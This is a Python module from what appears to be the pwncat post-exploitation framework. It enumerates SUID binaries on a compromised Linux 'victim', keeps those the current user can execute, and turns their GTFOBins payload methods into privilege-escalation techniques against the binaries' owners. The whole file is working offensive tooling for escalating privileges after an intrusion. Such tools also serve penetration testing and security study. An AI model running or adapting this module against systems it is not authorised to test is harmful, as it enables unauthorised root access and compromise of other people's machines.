#!/usr/bin/env python3

import pwncat
from pwncat.util import Access
from pwncat.gtfobins import Capability, Stream, BinaryNotFound
from pwncat.modules.escalate import (
    EscalateModule,
    EscalateError,
    GTFOTechnique,
    Technique,
    euid_fix,
)


@euid_fix
class SUIDTechnique(GTFOTechnique):
    """ Same as GTFO Technique but with EUID fix decorator """


class Module(EscalateModule):
    """
    Utilize binaries marked SETUID to escalate to a different user.
    This module uses the GTFOBins library to generically locate
    payloads for binaries with excessive permissions.
    """

    PLATFORM = [pwncat.platform.linux.Linux]

    def enumerate(self):
        """ Enumerate SUID binaries """

        for fact in pwncat.modules.run(
            "enumerate.gather", progress=self.progress, types=["file.suid"]
        ):

            try:
                binary = pwncat.victim.gtfo.find_binary(fact.data.path, Capability.ALL)
            except BinaryNotFound:
                continue

            perms = pwncat.victim.access(fact.data.path)
            if Access.EXECUTE not in perms:
                continue

            for method in binary.iter_methods(
                fact.data.path, Capability.ALL, Stream.ANY
            ):
                yield SUIDTechnique(fact.data.owner.name, self, method, suid=True)

    def human_name(self, tech: "Technique"):
        return f"[cyan]{tech.method.binary_path}[/cyan] ([red]setuid[/red])"
